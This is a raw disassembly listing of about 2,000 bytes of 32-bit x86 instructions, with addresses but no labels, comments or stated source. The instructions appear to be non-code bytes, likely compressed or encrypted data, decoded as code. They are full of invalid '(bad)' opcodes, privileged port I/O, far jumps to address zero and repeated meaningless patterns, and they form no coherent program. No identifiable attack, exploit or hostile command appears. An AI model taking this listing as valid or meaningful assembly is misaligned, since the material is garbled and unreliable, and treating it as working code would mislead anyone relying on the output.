  417235:	add    BYTE PTR [edi-0x38],ch
  417238:	sub    DWORD PTR [ecx+0x1ad18ce4],0x6ade8cc9
  417242:	add    BYTE PTR [ebx-0x77],0x1d
  417246:	xor    dh,dh
  417248:	push   ebx
  417249:	test   al,0x60
  41724b:	push   cs
  41724c:	jae    0x41724e
  41724e:	jle    0x4171d1
  417250:	faddp  st(1),st
  417252:	and    eax,0x76e77f04
  417257:	push   es
  417258:	add    BYTE PTR [eax],al
  41725a:	rcl    DWORD PTR [esi-0xf],0x53
  41725e:	retf   
  41725f:	add    eax,0x1f4bdf87
  417264:	or     eax,DWORD PTR [ecx-0x2f5a3]
  41726a:	jp     0x41726e
  41726c:	mov    bh,0xf4
  41726e:	fcmovne st,st(0)
  417270:	std    
  417271:	mov    BYTE PTR [ebp+0x49],dl
  417274:	out    dx,al
  417275:	push   ss
  417276:	sti    
  417277:	es stc 
  417279:	add    BYTE PTR [edx+0x5],bh
  41727c:	or     DWORD PTR [edi+0x40bf3e],esi
  417282:	jnp    0x417298
  417284:	dec    BYTE PTR [ebp+0x32]
  417287:	mov    edi,DWORD PTR [eax+edi*8+0x3a]
  41728b:	inc    BYTE PTR [ebx+ebp*4-0x7601f0dc]
  417292:	repnz inc esp
  417294:	fstp   QWORD PTR [edi]
  417296:	ret    
  417297:	cmp    edx,eax
  417299:	out    dx,al
	...
  4172a6:	add    BYTE PTR [eax],al
  4172a8:	add    bl,al
  4172aa:	inc    esp
  4172ab:	or     cl,dh
  4172ad:	xchg   ebx,eax
  4172ae:	cmp    DWORD PTR [eax],esi
  4172b0:	enter  0x4a93,0x80
  4172b4:	jecxz  0x417256
  4172b6:	pop    edi
  4172b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172b8:	stos   BYTE PTR es:[edi],al
  4172b9:	sub    esi,DWORD PTR [ebx]
  4172bb:	xor    cl,bl
  4172bd:	jae    0x4172f8
  4172bf:	shl    al,0x15
  4172c2:	jl     0x417297
  4172c4:	shl    esp,1
  4172c6:	jl     0x417287
  4172c8:	or     DWORD PTR [eax+0x7c],ebp
  4172cb:	int    0xc1
  4172cd:	xor    al,BYTE PTR [ecx]
  4172cf:	xor    eax,ecx
  4172d1:	push   ebx
  4172d2:	dec    edx
  4172d3:	and    bl,0x63
  4172d6:	push   edi
  4172d7:	add    al,0xff
  4172d9:	arpl   WORD PTR ds:0x2d9b8829,bx
  4172df:	and    al,0x7
  4172e1:	jb     0x41730f
  4172e3:	jns    0x4172b4
  4172e5:	mov    ds:0x9b310646,al
  4172ea:	gs inc ebx
  4172ec:	add    BYTE PTR [eax+0x5032d4db],0xdd
  4172f3:	sub    cl,BYTE PTR [eax+0x1242dab]
  4172f9:	push   edx
  4172fa:	sub    al,0x79
  4172fc:	(bad)  
  4172fd:	mov    ds:0x9330f416,al
  417302:	jne    0x417347
  417304:	add    BYTE PTR [eax+0x64ff08f7],0xbd
  41730b:	sub    ecx,DWORD PTR [eax+0x0]
	...
  417319:	add    BYTE PTR [eax],al
  41731b:	add    BYTE PTR [ebx],bh
  41731d:	lods   eax,DWORD PTR ds:[esi]
  41731e:	and    DWORD PTR [edi],ecx
  417320:	xchg   edx,eax
  417321:	lods   eax,DWORD PTR ds:[esi]
  417322:	jp     0x4172eb
  417324:	and    al,dh
  417326:	std    
  417327:	xor    BYTE PTR [ebx],dh
  417329:	gs inc esp
  41732b:	add    BYTE PTR [eax-0x9],0xf8
  41732f:	push   cs
  417330:	fs std 
  417332:	sub    ecx,DWORD PTR [edx-0x1dbd195a]
  417338:	pop    edi
  417339:	std    
  41733a:	cmp    al,0x88
  41733c:	jnp    0x4173a9
  41733e:	mov    esi,0xbe735f07
  417343:	pop    es
  417344:	(bad)  
  417346:	test   al,0x5d
  417348:	test   al,0x65
  41734a:	adc    eax,0x1f6215c
  41734f:	push   ebx
  417350:	lea    esi,[ebx-0x5b]
  417353:	and    ebx,DWORD PTR [edi+0x10]
  417356:	jnp    0x4173cb
  417358:	aas    
  417359:	ficomp WORD PTR [edi-0x9fb2a7c]
  41735f:	outs   dx,DWORD PTR ds:[esi]
  417360:	mov    bl,0xf
  417362:	xchg   ebp,eax
  417363:	inc    edx
  417364:	pop    ebp
  417365:	mov    eax,0x43d7b327
  41736a:	fbstp  TBYTE PTR [ebx+0x84159c4]
  417370:	mov    ch,0x6c
  417372:	xor    esi,DWORD PTR [edi-0x3c0fadd]
  417378:	test   al,0xff
  41737a:	cs clc 
  41737c:	aad    0xf6
  41737e:	mov    ebp,0xb4
	...
  41738f:	jl     0x4173d6
  417391:	and    DWORD PTR [eax],ecx
  417393:	lea    ebp,[ebx+ebx*4-0x4a]
  417397:	and    eax,DWORD PTR ds:0xff790fff
  41739d:	push   es
  41739e:	test   eax,0x3efc319
  4173a3:	push   ss
  4173a4:	mov    cs,WORD PTR [ebx+esi*4]
  4173a7:	adc    al,0x54
  4173a9:	bound  edi,QWORD PTR [esi-0x7bb759c]
  4173af:	out    0x58,eax
  4173b1:	fbstp  TBYTE PTR [edx+0x824ed9c]
  4173b7:	inc    ebp
  4173b8:	(bad)  
  4173b9:	aas    
  4173ba:	nop
  4173bb:	test   al,0x44
  4173bd:	out    0x78,eax
  4173bf:	lahf   
  4173c0:	std    
  4173c1:	pop    ss
  4173c2:	sbb    al,0x35
  4173c4:	add    dh,BYTE PTR [edi+0x1bf9bc07]
  4173ca:	lds    ebx,FWORD PTR [edx+edx*4]
  4173cd:	sub    al,0xc
  4173cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173d0:	in     eax,dx
  4173d1:	nop
  4173d2:	or     BYTE PTR ds:0x978fffff,cl
  4173d8:	inc    esp
  4173d9:	out    0x78,eax
  4173db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173dc:	std    
  4173dd:	pop    ss
  4173de:	sbb    al,0x19
  4173e0:	add    bh,BYTE PTR [edi+0x7]
  4173e3:	xchg   ecx,eax
  4173e4:	nop
  4173e5:	add    BYTE PTR [edi+edx*2],ch
  4173e8:	dec    esi
  4173e9:	call   0xfe40df59
  4173ee:	ret    0xea57
  4173f1:	pop    ebx
  4173f2:	sub    eax,DWORD PTR [eax]
	...
  417400:	add    BYTE PTR [eax],al
  417402:	iret   
  417403:	(bad)  
  417404:	push   esp
  417405:	pusha  
  417406:	add    BYTE PTR [ebx+0x58f1f9ec],0x89
  41740d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41740e:	mov    eax,0x2bed738b
  417413:	dec    ecx
  417414:	clc    
  417415:	cdq    
  417416:	icebp  
  417417:	out    0xfa,al
  417419:	xor    ah,BYTE PTR [edi+edi*8-0x75]
  41741d:	lods   al,BYTE PTR ds:[esi]
  41741e:	jo     0x41746e
  417420:	sub    DWORD PTR [edx],0x4e8538f
  417426:	pop    eax
  417427:	(bad)  
  417428:	std    
  417429:	sub    esp,0xfbe93f4a
  41742f:	dec    eax
  417430:	clc    
  417431:	cdq    
  417432:	dec    eax
  417433:	xchg   edi,eax
  417434:	cld    
  417435:	neg    BYTE PTR [ebp+0x66]
  417438:	je     0x4173d7
  41743a:	daa    
  41743b:	dec    BYTE PTR [esp+ebp*1+0x70e84e6f]
  417442:	fs (bad) 
  417444:	std    
  417445:	(bad)  
  417446:	sti    
  417447:	stc    
  417448:	mov    DWORD PTR [edi+edx*2],esp
  41744b:	lea    eax,[ebx-0x3b]
  41744e:	mov    bh,0x61
  417450:	lock push ecx
  417452:	push   ebx
  417453:	dec    edx
  417454:	aas    
  417455:	jmp    0x1a39be05
  41745a:	jg     0x4174cb
  41745c:	cld    
  41745d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41745e:	pop    ebp
  41745f:	data16 hlt 
  417461:	sub    eax,0x2c8cfe26
	...
  417472:	add    BYTE PTR [eax],al
  417474:	add    BYTE PTR [edi+0x4e],ch
  417477:	call   0xfe40df84
  41747c:	add    BYTE PTR [ecx-0x53],dh
  41747f:	stc    
  417480:	mov    eax,DWORD PTR [edi+0x19]
  417483:	mov    BYTE PTR [ebp+0x6e],al
  417486:	sbb    DWORD PTR [eax+esi*8+0x62],0xca414c95
  41748e:	jl     0x4174d4
  417490:	clc    
  417491:	or     bl,BYTE PTR [edx]
  417493:	inc    esi
  417494:	cld    
  417495:	sub    eax,0xdf746507
  41749a:	enter  0x8cfd,0x7
  41749e:	adc    cl,BYTE PTR [ebp-0x18]
  4174a1:	arpl   WORD PTR ds:0x7cc4fffe,cx
  4174a7:	inc    esp
  4174a8:	clc    
  4174a9:	cli    
  4174aa:	sbb    ebp,ebx
  4174ac:	sti    
  4174ad:	cmp    eax,0x92c68207
  4174b2:	scas   eax,DWORD PTR es:[edi]
  4174b3:	mov    WORD PTR [ebp+0x6a],es
  4174b6:	mov    dl,0xe5
  4174b8:	rcl    DWORD PTR [ecx+0x7],cl
  4174bb:	(bad)  
  4174bc:	pop    esi
  4174bd:	rol    DWORD PTR [eax-0x5c7a217],0xfd
  4174c4:	push   esp
  4174c5:	add    esp,DWORD PTR ds:0x1beec80
  4174cb:	add    BYTE PTR [eax],al
  4174cd:	cdq    
  4174ce:	stos   DWORD PTR es:[edi],eax
  4174cf:	push   esi
  4174d0:	mov    ecx,DWORD PTR [edi+0x3e758af9]
  4174d6:	je     0x41745c
  4174d8:	add    BYTE PTR [eax],0x0
	...
  4174e7:	add    BYTE PTR [ebx+eax*1],ch
  4174ea:	(bad)  
  4174eb:	push   eax
  4174ec:	adc    al,BYTE PTR [ebp+0x0]
  4174ef:	add    BYTE PTR [edx],bh
  4174f1:	lahf   
  4174f2:	std    
  4174f3:	addr16 out 0xb4,al
  4174f6:	inc    eax
  4174f7:	add    BYTE PTR [edx],ah
  4174f9:	jns    0x4174f6
  4174fb:	(bad)  
  4174fc:	mov    ebp,0x788acfd8
  417501:	adc    eax,0xee63414c
  417506:	jns    0x41750b
  417508:	xor    DWORD PTR [eax],esi
  41750a:	jg     0x417505
  41750c:	imul   eax,DWORD PTR [edx],0x11
  41750f:	(bad)  
  417510:	out    0x6,al
  417512:	push   es
  417513:	(bad)  
  417514:	in     al,0xed
  417516:	add    DWORD PTR [eax],eax
  417518:	arpl   WORD PTR [edi+0x75d388b0],ax
  41751e:	jge    0x417593
  417520:	int    0x5b
  417522:	add    esi,DWORD PTR [eax]
  417524:	mov    cl,0x47
  417526:	aam    0x8a
  417528:	out    0xd2,al
  41752a:	add    edi,esi
  41752c:	mov    ah,0x75
  41752e:	jge    0x4175ab
  417530:	lods   eax,DWORD PTR ds:[esi]
  417531:	cmp    eax,DWORD PTR [ebx]
  417533:	(bad)  
  417534:	fidivr WORD PTR [edx+0x679cfe03]
  41753a:	jne    0x4175b7
  41753c:	xchg   ebp,eax
  41753d:	and    eax,DWORD PTR [ebx]
  41753f:	push   cs
  417540:	int    0xef
  417542:	sbb    bh,0x4
  417545:	addr16 inc ebp
  417547:	jnp    0x4175c6
  417549:	or     eax,DWORD PTR [ebx]
  41754b:	push   cs
	...
  417558:	add    BYTE PTR [eax],al
  41755a:	add    BYTE PTR [ebp-0x24082d3d],ch
  417560:	in     eax,dx
  417561:	cmp    eax,DWORD PTR [edx]
  417563:	arpl   WORD PTR [edi-0x19a67d41],bp
  417569:	xchg   BYTE PTR [ebx+eiz*8],al
  41756c:	es add al,0x75
  41756f:	and    eax,0xb8e7ae34
  417574:	aam    0x4
  417576:	(bad)  
  417577:	loopne 0x4174f9
  417579:	mov    ebp,edi
  41757b:	xor    al,0xc3
  41757d:	add    DWORD PTR [eax-0x59711198],eax
  417583:	loopne 0x4175f5
  417585:	mov    ebp,edi
  417587:	sbb    al,0xab
  417589:	add    DWORD PTR [ebp-0xb],esi
  41758c:	add    al,0x74
  41758e:	jle    0x41751c
  417590:	sti    
  417591:	sahf   
  417592:	add    al,0x94
  417594:	in     eax,dx
  417595:	push   cs
  417596:	add    esp,DWORD PTR [ebx+0x5]
  417599:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41759b:	cdq    
  41759c:	mov    ss,WORD PTR [ebx-0x18f2dd5a]
  4175a2:	scas   al,BYTE PTR es:[edi]
  4175a3:	fndisi(8087 only) 
  4175a5:	push   0xe705e817
  4175aa:	add    esi,DWORD PTR [eax]
  4175ac:	push   ebx
  4175ad:	mov    esi,0x720d2f78
  4175b2:	mov    ds,WORD PTR [eax-0x76]
  4175b5:	ins    BYTE PTR es:[edi],dx
  4175b6:	cmp    DWORD PTR [esi-0x434cb105],0xfffffffb
  4175bd:	out    0x3,eax
	...
  4175cb:	add    BYTE PTR [eax],al
  4175cd:	add    BYTE PTR [ebx+0x6f],ah
  4175d0:	out    0x9b,eax
  4175d2:	mov    al,0x49
  4175d4:	test   al,0x3
  4175d6:	mov    edx,edi
  4175d8:	sub    al,0x4
  4175da:	xchg   ebp,eax
  4175db:	xor    eax,0xf0e27939
  4175e0:	lods   al,BYTE PTR ds:[esi]
  4175e1:	ret    0x8384
  4175e4:	jmp    0x4175b7
  4175e6:	and    cl,BYTE PTR [eax-0xa070cef]
  4175ec:	cs jle 0x4175e3
  4175ef:	cli    
  4175f0:	inc    BYTE PTR [ebx]
  4175f2:	arpl   WORD PTR ds:0x524803e7,ax
  4175f8:	pusha  
  4175f9:	adc    ebp,ebx
  4175fb:	sbb    BYTE PTR [ebx+0x2],0x4d
  4175ff:	sti    
  417600:	sbb    dh,dl
  417602:	cmp    dh,BYTE PTR [esi]
  417604:	bound  ecx,QWORD PTR [ecx+0x3cefbb7]
  41760a:	jmp    0x41758c
  41760c:	inc    ebx
  41760d:	add    ch,BYTE PTR ds:0xaf89befb
  417613:	sti    
  417614:	add    BYTE PTR [esi+0x2d8b8f60],dh
  41761a:	popa   
  41761b:	sti    
  41761c:	std    
  41761d:	mul    BYTE PTR [edx]
  41761f:	add    eax,0x8ce08981
  417624:	mov    ebx,0xfdfb6115
  417629:	fidivr WORD PTR [edx-0x207ed0c8]
  41762f:	cli    
  417630:	ret    
  417631:	jmp    0x0:0x0
	...
  417640:	add    BYTE PTR [eax+0x44],ah
  417643:	inc    edx
  417644:	push   0xffffffdd
  417646:	adc    eax,0x3ce0e47b
  41764b:	add    ah,bl
  41764d:	call   0xfdf9:0x61515653
  417654:	push   esi
  417655:	in     al,0xa6
  417657:	js     0x4176a8
  417659:	pusha  
  41765a:	sti    
  41765b:	add    BYTE PTR [ecx+0x6c],ch
  41765e:	add    eax,0xbedc8673
  417663:	js     0x41769c
  417665:	pusha  
  417666:	sti    
  417667:	add    BYTE PTR [edx+eax*8+0x6169838e],dh
  41766e:	sti    
  41766f:	std    
  417670:	mov    ecx,0xe900a278
  417675:	pusha  
  417676:	pop    eax
  417677:	pop    esi
  417678:	mov    dl,0xe7
  41767a:	jmp    0x5a0a1da
  41767f:	push   ecx
  417680:	xchg   edi,eax
  417681:	or     DWORD PTR [esp+eax*2-0x769c8f33],ecx
  417688:	lea    edi,[ecx+edx*1+0x66]
  41768c:	ins    BYTE PTR es:[edi],dx
  41768d:	sub    eax,0x1a700976
  417692:	mov    ?,WORD PTR [eax-0x7]
  417695:	retf   0xffbf
  417698:	call   0xcc83e2
  41769d:	push   0x11
  41769f:	test   edi,eax
  4176a1:	pushf  
  4176a2:	xor    dl,dl
  4176a4:	sldt   WORD PTR [eax]
	...
  4176b3:	add    BYTE PTR [ebp-0x357cad30],bl
  4176b9:	or     eax,0xff7ee850
  4176be:	sti    
  4176bf:	push   DWORD PTR [edx-0x3]
  4176c2:	dec    esp
  4176c3:	inc    ecx
  4176c4:	or     ch,dh
  4176c6:	cmp    bh,cl
  4176c8:	in     eax,0x6
  4176ca:	push   cs
  4176cb:	mov    bh,0xc1
  4176cd:	push   edx
  4176ce:	push   ebx
  4176cf:	call   0x3d75be
  4176d4:	bound  edi,QWORD PTR [ebp+0x49]
  4176d7:	inc    ecx
  4176d8:	retf   0x26ed
  4176db:	stc    
  4176dc:	inc    ebp
  4176dd:	pop    es
  4176de:	push   cs
  4176df:	mov    bh,0x21
  4176e1:	push   ebx
  4176e2:	push   esi
  4176e3:	call   0x3d75de
  4176e8:	add    eax,0xb2c25764
  4176ed:	add    eax,0x21c68b4f
  4176f2:	or     BYTE PTR [ebx+0x22],dl
  4176f5:	or     esi,ebp
  4176f7:	inc    DWORD PTR [ebp-0x7f]
  4176fa:	mov    edi,0x57a80
  4176ff:	mov    eax,0x3d4a6e
  417704:	add    DWORD PTR [esi],edx
  417706:	test   DWORD PTR [ebx],edx
  417708:	or     esi,eax
  41770a:	add    al,0x83
  41770c:	cmp    DWORD PTR [edx],eax
  41770e:	cmp    DWORD PTR [edi+esi*4+0x40],esi
  417712:	add    BYTE PTR [edx+0x65],dh
  417715:	mov    esp,0x4d74
	...
  417726:	add    BYTE PTR [ebx],cl
  417728:	add    eax,0x12d31087
  41772d:	jg     0x4176ef
  41772f:	cmp    BYTE PTR ds:[edi-0x7ee9cfc],0x4b
  417737:	mov    ds:0x88ed73ee,al
  41773c:	lods   al,BYTE PTR ds:[esi]
  41773d:	or     BYTE PTR [eax],al
  41773f:	nop
  417740:	jae    0x4177a2
  417742:	and    al,0x6b
  417744:	sbb    ebp,esp
  417746:	call   0x80411f66
  41774b:	and    BYTE PTR [edi+0x4],ch
  41774e:	add    BYTE PTR [ebx+0x66],ah
  417751:	clc    
  417752:	dec    esp
  417753:	mov    ds:0xea118cee,al
  417758:	inc    BYTE PTR [ecx+eax*8+0x4c46b67]
  41775f:	es repnz dec esi
  417762:	aas    
  417763:	arpl   sp,di
  417765:	lock mov eax,0x41194f
  41776b:	fdivr  st,st(3)
  41776d:	mov    dl,BYTE PTR [eax]
  41776f:	loopne 0x41779c
  417771:	or     BYTE PTR [ecx-0xbc1155d],al
  417777:	lods   eax,DWORD PTR es:[esi]
  417779:	add    DWORD PTR [edx-0x44],esi
  41777c:	mov    ds:0x916304c3,eax
  417781:	mov    ah,bl
  417783:	loopne 0x4177c7
  417785:	sbb    al,0x51
  417787:	sub    eax,0x85d63
	...
  417798:	add    BYTE PTR [eax],al
  41779a:	fcomp  DWORD PTR [ecx+0x261e8b0d]
  4177a0:	push   esp
  4177a1:	push   ecx
  4177a2:	mov    eax,DWORD PTR [ecx]
  4177a4:	cld    
  4177a5:	std    
  4177a6:	je     0x417801
  4177a8:	inc    ebp
  4177a9:	lock adc esi,DWORD PTR [ecx+0x43]
  4177ad:	or     BYTE PTR [ebx],dl
  4177af:	push   ss
  4177b0:	in     al,0xf8
  4177b2:	pop    esp
  4177b3:	out    dx,eax
  4177b4:	mov    es,WORD PTR [ebx+0x4b]
  4177b7:	sahf   
  4177b8:	test   cl,al
  4177ba:	jae    0x4177c1
  4177bc:	cmp    ch,ah
  4177be:	xor    bh,ch
  4177c0:	fiadd  WORD PTR [eax]
  4177c2:	retf   0x2371
  4177c5:	inc    ebx
  4177c6:	arpl   WORD PTR [edx-0x126c03dc],cx
  4177cc:	inc    esp
  4177cd:	sti    
  4177ce:	es clc 
  4177d0:	dec    edi
  4177d1:	js     0x417782
  4177d3:	inc    esi
  4177d4:	out    0x8e,eax
  4177d6:	mov    al,ds:0x7eec17f5
  4177db:	(bad)  
  4177dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177dd:	add    BYTE PTR [edx+0x71],bh
  4177e0:	sub    eax,DWORD PTR [ebx+0x63]
  4177e3:	mov    ch,BYTE PTR [esp+ebp*8]
  4177e6:	xchg   ebx,eax
  4177e7:	in     eax,dx
  4177e8:	or     bl,bh
  4177ea:	out    dx,al
  4177eb:	div    DWORD PTR [edx+0x5e]
  4177ee:	out    0x8b,eax
  4177f0:	and    al,0xf4
  4177f2:	in     al,0x41
  4177f4:	jae    0x417780
  4177f6:	cmp    ch,dh
  4177f8:	bound  ebx,QWORD PTR [esi-0x29]
  4177fb:	mov    ebp,DWORD PTR [ebx+ebp*8+0x0]
	...
  41780a:	add    BYTE PTR [eax],al
  41780c:	add    ah,bl
  41780e:	inc    ecx
  41780f:	push   ebx
  417810:	mov    bl,BYTE PTR [eax]
  417812:	in     eax,dx
  417813:	mov    edi,0xe74627f7
  417818:	mov    fs,WORD PTR [eax]
  41781a:	std    
  41781b:	xchg   edi,eax
  41781c:	jmp    0x417888
  41781e:	(bad)  
  41781f:	add    BYTE PTR ds:[edx],cl
  417822:	icebp  
  417823:	mov    ds:0xa48a6342,eax
  417828:	repz xor ebp,ebp
  41782b:	aam    0xfa
  41782d:	xchg   bh,dh
  41782f:	(bad)  
  417830:	imul   DWORD PTR [edi]
  417832:	inc    esi
  417833:	out    0x8e,eax
  417835:	and    ch,ch
  417837:	mov    bh,0xeb
  417839:	dec    esi
  41783a:	inc    BYTE PTR [esi]
  41783c:	add    cl,bl
  41783e:	pop    ecx
  41783f:	sti    
  417840:	mov    esp,DWORD PTR [eax-0x629fff0b]
  417846:	stc    
  417847:	xchg   DWORD PTR [eax+edx*2-0x2722a473],ecx
  41784e:	inc    edx
  41784f:	call   0x883322c4
  417854:	xor    al,0x47
  417856:	outs   dx,BYTE PTR ds:[esi]
  417857:	je     0x417875
  417859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41785a:	add    eax,0x56272c8b
  41785f:	call   0xfe3a9824
  417864:	inc    ecx
  417865:	fwait
  417866:	dec    edx
  417867:	aas    
  417868:	jmp    0x3a31bb60
  41786d:	imul   esp
  41786f:	clc    
  417870:	sahf   
	...
  41787d:	add    BYTE PTR [eax],al
  41787f:	add    ah,bh
  417881:	ins    DWORD PTR es:[edi],dx
  417882:	je     0x4178a8
  417884:	sahf   
  417885:	add    eax,0x55ff248b
  41788a:	call   0xfe3a6033
  41788f:	pop    ss
  417890:	repnz inc edx
  417892:	clc    
  417893:	sbb    edi,eax
  417895:	cmp    eax,0x468acc6e
  41789b:	icebp  
  41789c:	xor    BYTE PTR [edx-0x12e8a6bd],cl
  4178a2:	jne    0x4178f5
  4178a4:	mov    ah,0xf8
  4178a6:	and    DWORD PTR [edi],0xac8b4f57
  4178ac:	mov    eax,0x98d3e855
  4178b1:	clc    
  4178b2:	std    
  4178b3:	xchg   edi,eax
  4178b4:	cmp    DWORD PTR [esi-0x14],edi
  4178b7:	mov    WORD PTR [edx-0x2843fff3],fs
  4178bd:	loop   0x41793e
  4178bf:	or     eax,0xe9fdf6d3
  4178c4:	adc    DWORD PTR [edi+0x55],ecx
  4178c7:	bound  eax,QWORD PTR [edx]
  4178c9:	or     eax,0x5e70089
  4178ce:	mov    DWORD PTR [ebp-0x40836],eax
  4178d4:	cli    
  4178d5:	jmp    0xf77f772e
  4178da:	push   0x0
  4178dc:	mov    dl,0xfd
  4178de:	dec    ecx
  4178df:	inc    ecx
  4178e0:	dec    edx
  4178e1:	jmp    0x0:0xfde5
	...
  4178f0:	add    BYTE PTR [eax],al
  4178f2:	add    BYTE PTR ds:0xc0d22df7,cl
  4178f8:	test   ah,dh
  4178fa:	dec    ebp
  4178fb:	jnp    0x4178fe
  4178fd:	mov    BYTE PTR [eax+ebx*1],al
  417900:	inc    esp
  417901:	jg     0x4178fd
  417903:	xor    dh,BYTE PTR [esi-0x13]
  417906:	mov    DWORD PTR [edi-0x42000186],0xa000000
  417910:	jmp    0x417966
  417912:	mov    edx,ebx
  417914:	mov    BYTE PTR [ecx-0x409238c],al
  41791a:	xor    eax,ecx
  41791c:	jmp    0xfffe:0x6e478b30
  417923:	dec    ebp
  417924:	mov    DWORD PTR [ecx-0x408c384],eax
  41792a:	push   DWORD PTR [edi]
  41792c:	outs   dx,BYTE PTR ds:[esi]
  41792d:	(bad)  
  41792e:	call   FWORD PTR ds:0xc7c898b
  417934:	idiv   ebx
  417936:	paddusb mm0,QWORD PTR [edx]
  417939:	jg     0x41791b
  41793b:	popf   
  41793c:	mov    bh,BYTE PTR [ecx-0x408a384]
  417942:	unpcklps xmm6,XMMWORD PTR [edi]
  417945:	sub    eax,0xc60102f8
  41794a:	add    edi,DWORD PTR [edx+0x42]
  41794d:	inc    edx
  41794e:	add    DWORD PTR [eax+0x1a],0x79
  417952:	add    eax,0x3a6c63
	...
  417963:	add    BYTE PTR [eax],al
  417965:	add    dh,dh
  417967:	sbb    eax,0x8b7b5653
  41796c:	sti    
  41796d:	std    
  41796e:	pop    esp
  41796f:	pusha  
  417970:	test   al,0x78
  417972:	push   ebp
  417973:	cld    
  417974:	sti    
  417975:	add    bl,ah
  417977:	mov    bh,0x1
  417979:	jae    0x417977
  41797b:	pop    edi
  41797c:	mov    ebp,0xfbd43d78
  417981:	add    BYTE PTR [esi-0x1c7c7284],ch
  417987:	(bad)  
  417988:	sti    
  417989:	std    
  41798a:	xchg   ebx,eax
  41798b:	(bad)  
  41798c:	(bad)  
  41798d:	sti    
  41798e:	sbb    al,0xb4
  417990:	pop    ebx
  417991:	pop    esi
  417992:	mov    eax,0x215bf065
  417997:	out    0x1,eax
  417999:	push   ebx
  41799a:	fiadd  DWORD PTR [ecx+0x3c905054]
  4179a0:	xchg   DWORD PTR [ebx+0x6b],edx
  4179a3:	addr16 pop ebp
  4179a5:	or     al,0xd8
  4179a7:	sbb    DWORD PTR [edi+ebp*1],edx
  4179aa:	sbb    bh,BYTE PTR [ecx+0x8]
  4179ad:	por    mm5,QWORD PTR [edx]
  4179b0:	or     eax,0x12e2e9f8
  4179b5:	mov    BYTE PTR [edi-0x2b],ah
  4179b8:	inc    edx
  4179b9:	or     edx,0x10eb7df6
  4179bf:	mov    al,0xe9
  4179c1:	lods   al,BYTE PTR ds:[esi]
  4179c2:	mov    ecx,0x912ffb5b
  4179c7:	push   ecx
  4179c8:	adc    BYTE PTR [edx],bl
	...
  4179d6:	add    BYTE PTR [eax],al
  4179d8:	add    cl,bl
  4179da:	loop   0x417a0b
  4179dc:	xor    ah,BYTE PTR [edx+0x76]
  4179df:	add    DWORD PTR [edx-0x20],eax
  4179e2:	cmp    BYTE PTR [esp+edi*2],cl
  4179e5:	xchg   ebx,eax
  4179e6:	in     eax,dx
  4179e7:	iret   
  4179e8:	mov    bl,BYTE PTR [edi]
  4179ea:	add    eax,0x9ebfbfc
  4179ef:	fld    DWORD PTR [ecx-0x1e]
  4179f2:	out    dx,eax
  4179f3:	fistp  QWORD PTR [edi+0x72]
  4179f6:	push   ebx
  4179f7:	mov    dl,0x8a
  4179f9:	ja     0x417a4d
  4179fb:	sub    DWORD PTR [eax],edx
  4179fd:	arpl   WORD PTR ds:0x56303e7,ax
  417a03:	out    0x3,eax
  417a05:	arpl   WORD PTR ds:0x56303e7,ax
  417a0b:	out    0x3,eax
  417a0d:	arpl   WORD PTR ds:0x56303e7,ax
  417a13:	out    0x3,eax
  417a15:	arpl   WORD PTR ds:0x56303e7,ax
  417a1b:	out    0x3,eax
  417a1d:	arpl   WORD PTR ds:0x56303e7,ax
  417a23:	out    0x3,eax
  417a25:	arpl   WORD PTR ds:0x56303e7,ax
  417a2b:	out    0x3,eax
  417a2d:	arpl   WORD PTR ds:0x56303e7,ax
  417a33:	out    0x3,eax
  417a35:	arpl   WORD PTR ds:0x56303e7,ax
  417a3b:	out    0x3,eax
	...
  417a49:	add    BYTE PTR [eax],al
  417a4b:	add    BYTE PTR [ebx+0x5],ah
  417a4e:	out    0x3,eax
  417a50:	arpl   WORD PTR ds:0x56303e7,ax
  417a56:	out    0x3,eax
  417a58:	arpl   WORD PTR ds:0x56303e7,ax
  417a5e:	out    0x3,eax
  417a60:	arpl   WORD PTR ds:0x56303e7,ax
  417a66:	out    0x3,eax
  417a68:	arpl   WORD PTR ds:0x56303e7,ax
  417a6e:	out    0x3,eax
  417a70:	arpl   WORD PTR ds:0x560e900,ax
  417a76:	add    cl,ch
  417a78:	pusha  
  417a79:	add    eax,0x560e900
  417a7e:	add    cl,ch
  417a80:	pusha  
  417a81:	add    eax,0x5ae400
  417a86:	or     cl,BYTE PTR [eax-0x7498bef0]
  417a8c:	cmp    BYTE PTR [ebx+0x2f],0xcf
  417a90:	nop
  417a91:	and    ah,BYTE PTR [eax]
  417a93:	leave  
  417a94:	jge    0x417abb
  417a96:	and    BYTE PTR [ebp-0x48],dh
  417a99:	data16 and BYTE PTR [edx-0x36],bl
  417a9d:	push   edx
  417a9e:	ins    BYTE PTR es:[edi],dx
  417a9f:	dec    ebp
  417aa0:	ret    0x2077
  417aa3:	pop    ebp
  417aa4:	mov    edi,0xc24b2066
  417aa9:	jns    0x417b1f
  417aab:	dec    esp
  417aac:	xchg   ebp,eax
  417aad:	and    eax,0x103a
	...
  417abe:	add    BYTE PTR [edx-0x1],ch
  417ac1:	inc    eax
  417ac2:	inc    esi
  417ac3:	xchg   edi,eax
  417ac4:	jp     0x417b38
  417ac6:	inc    eax
  417ac7:	sbb    BYTE PTR [ebp+0x74],0xc9
  417acb:	dec    eax
  417acc:	fs daa 
  417ace:	leave  
  417acf:	das    
  417ad0:	cmp    dh,BYTE PTR [edi]
  417ad2:	sar    DWORD PTR [ebx],1
  417ad4:	aaa    
  417ad5:	xor    cl,bl
  417ad7:	daa    
  417ad8:	and    eax,0x3f870062
  417add:	ins    DWORD PTR es:[edi],dx
  417ade:	add    al,0x4d
  417ae0:	push   0x4a870763
  417ae5:	(bad)  
  417ae6:	cli    
  417ae7:	inc    ebx
  417ae8:	arpl   WORD PTR [ecx+ecx*1],bp
  417aeb:	es popa 
  417aed:	ins    BYTE PTR es:[edi],dx
  417aee:	or     DWORD PTR ds:0x3cc1656a,ecx
  417af4:	je     0x417b16
  417af6:	mov    ebx,0x637443
  417afb:	fdiv   DWORD PTR [ecx+eiz*2+0x64]
  417aff:	fs cld 
  417b01:	or     DWORD PTR ds:0x726b3d80,ecx
  417b07:	lahf   
  417b08:	es outs dx,BYTE PTR gs:[esi]
  417b0b:	in     al,dx
  417b0c:	pop    edi
